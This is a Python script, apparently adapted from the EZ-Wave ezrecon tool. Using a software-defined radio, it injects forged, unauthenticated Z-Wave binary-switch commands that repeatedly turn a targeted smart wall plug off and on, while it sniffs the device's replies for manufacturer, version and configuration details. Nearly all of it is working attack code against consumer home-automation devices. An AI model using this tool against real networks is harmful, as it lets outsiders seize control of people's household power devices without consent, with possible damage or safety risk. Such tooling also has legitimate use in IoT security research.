#!/usr/bin/python

#this script is ezrecon.py that has been modified in order to toogle a wall plug (like fibaro)
#to use it, you need first to detect Zwave Network with ezstumbler.py passive scan

import os
from scapy.modules.gnuradio import *
from scapy.all import *
from scapy.layers.ZWave import *
from utils.ezutils import *
from argparse import ArgumentParser


def verify_checksum(packet):
    p = bytearray(str(packet))
    p = p[:-1]
    calc_crc = hex(reduce(lambda x, y: x ^ y, p, 0xFF))
    crc_byte = packet[ZWaveReq].get_field('crc').i2repr(packet, packet.crc)
    if calc_crc == crc_byte:
        return True
    else:
        return False


def handle_packets(packet, target):
    if packet.homeid == target.homeid and packet.src == target.nodeid:
        if verify_checksum(packet[ZWaveReq]):
            #packet[ZWaveReq].show()
            if packet.cmd_class == 0x72 and packet.cmd == 0x05:
                target.manspec = str(packet[Raw]).encode("HEX")
                target.parse_manspec()
                return
            elif packet.cmd_class == 0x86 and packet.cmd == 0x12:
                target.version = str(packet[Raw]).encode("HEX")
                return
            elif packet.cmd_class == 0x01:
                target.cmdclasses = str(packet[Raw])[6:].encode("HEX")
                return
            elif packet.cmd_class == 0x20 and packet.cmd == 0x03:
                target.basic = str(packet[Raw]).encode("HEX")
                return
            elif packet.cmd_class == 0x70 and packet.cmd == 0x06:
                target.configs[str(packet[Raw])[:2].encode("HEX")] = str(packet[Raw])[2:].encode("HEX")


if __name__ == "__main__":
    parser = ArgumentParser(sys.argv[0])
    parser.add_argument("homeid", type=str, help="4 byte HomeID of target network (ex: 0x1a2b3c4d)")
    parser.add_argument("nodeid", type=int, help="Target device NodeID (in decimal, <233)" )
    parser.add_argument("-c", "--config", action="store_true",
                        help="Include scan of device configuration settings (takes a while)")
    parser.add_argument("-t", "--timeout", type=int, default=30,
                        help="Stop scanning after a given time (secs, default=30)")

    args = parser.parse_args(sys.argv[1:])

    load_module('gnuradio')

    homeid = int(args.homeid,16)
    nodeid = args.nodeid
    _target = ZWaveNode(homeid, nodeid)

    print "Interrogating " + hex(homeid) + " Node " + str(nodeid)

    if args.config:
        config = ZWave(homeid=homeid, ackreq=1, dst=nodeid) / ZWaveConfiguration(cmd="GET")
        _target.configs = dict()
    else:
        _target.configs = False

    timeout = args.timeout
    #add lcl
    print "debut toogle"
    timer = time.time()
    toggle = 0
    
    #fin add lcl
    pid = os.fork()
    if pid > 0:
        timer = time.time()
        i = 0
        while time.time() - timer < timeout:
            toggle = (toggle + 1)  % 2
            print "send command 3 times"
            if toggle:
                #OFF
                print "send OFF"
                packet = ZWave(homeid=homeid, dst=nodeid) / ZWaveSwitchBin(cmd="SET") / chr(0) #or \x00 for OFF
            else:
                #ON
                print "send ON"
                packet = ZWave(homeid=homeid, dst=nodeid) / ZWaveSwitchBin(cmd="SET") / chr(99) #or \x63 for ON
            #send the packet 3 times to make sure it actually gets sent
            for _ in range(0,3):
                send(packet, verbose=True)
                time.sleep(1)
            time.sleep(3)

    else:
        #need to keep this function, toogle does not work if not kept
        sniffradio(radio="Zwave", store=0, count=None, timeout=timeout,
                   prn=lambda p,t=_target: handle_packets(p,t),
                   lfilter=lambda x: x.haslayer(ZWaveReq))

        print "\n****************** Recon Results *********************\n"
        print "**************** Home ID: " + hex(homeid) + " *****************"
        #_target.display(verbose=True)


    print "Exit"
